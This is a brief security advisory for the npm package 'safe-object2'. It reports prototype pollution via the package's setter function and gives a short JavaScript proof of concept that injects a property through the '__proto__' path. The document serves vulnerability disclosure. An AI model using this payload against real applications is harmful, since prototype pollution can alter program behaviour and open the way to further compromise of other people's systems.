# Overview

`safe-object2` is a Secure operation object `get/set`, this package is vulnerable to Prototype Pollution via. the `setter` function.

# Proof of Concept
```
const safeObj2 = require(""safe-object2"");
const obj = safeObj2({});
obj.setter(['__proto__', 'polluted'], true)
console.log(polluted); // true
```